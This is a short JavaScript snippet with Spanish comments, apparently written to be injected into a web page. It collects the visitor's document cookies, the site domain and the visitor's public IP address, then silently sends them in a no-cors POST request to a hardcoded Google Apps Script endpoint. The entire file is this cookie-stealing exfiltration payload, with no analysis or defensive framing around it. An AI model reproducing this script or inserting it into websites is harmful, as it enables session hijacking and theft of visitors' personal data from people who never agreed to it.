(function() {
    // Obtener cookies del documento
    let cookies = document.cookie;

    // Obtener el dominio actual
    let domain = window.location.hostname;

    // Obtener la IP pública
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            let ip = data.ip;

            // Construimos el payload con la información recolectada
            let payload = {
                cookies: cookies,
                ip: ip,
                domain: domain
            };

            // Enviar los datos a Google Apps Script
            fetch('https://script.google.com/macros/s/AKfycbwX5jW93ffmUvAX9o4TWK9RXULSPN64XZIQ-FhnSa54vCdHpd5IAgxOblam61YocgCt/exec', {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .catch(error => console.error('Error obteniendo la IP:', error));
})();
